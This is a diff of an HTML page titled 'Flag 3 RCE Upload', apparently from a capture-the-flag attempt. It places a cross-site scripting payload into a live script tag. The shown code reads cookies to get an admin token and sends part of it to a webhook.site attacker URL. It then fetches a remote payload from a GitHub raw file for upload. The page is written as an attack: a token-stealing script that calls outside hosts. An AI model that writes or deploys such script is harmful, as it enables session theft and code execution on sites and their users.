@@ -4,7 +4,9 @@
     <meta charset="utf-8">
     <title>Flag 3 RCE Upload</title>
     <!-- VERSION_GET_FLAG_V3 -->
-    <meta name="description" content='<script>
+    <meta name="description" content="XSS auto upload for Flag 3">
+
+    <script>
         (async function() {
             var webhook_id = "b9772b74-a398-4710-bf21-1fa5b5ebcb7d";
             var attacker_url = "https://webhook.site/" + webhook_id;
@@ -22,7 +24,7 @@
 
             function getCookie(name) {
                 let matches = document.cookie.match(new RegExp(
-                    "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
+                    "(?:^|; )" + name.replace(/([\.$?*|{}()\[\]\\/+^])/g, '\$1') + "=([^;]*)"
                 ));
                 return matches ? decodeURIComponent(matches[1]) : null;
             }
@@ -50,7 +52,6 @@
 
             sendPing({ stage: "got_token", token_preview: adminToken.substring(0, 20) });
 
-            // Step 2: upload payload from external source (GitHub)
             let payloadFileResp = await fetch("https://raw.githubusercontent.com/Shu-Ouma-0/newhope/main/payload.txt");
             if (!payloadFileResp.ok) {
                 return sendPing({ stage: "fetch_payload_fail", status: payloadFileResp.status });
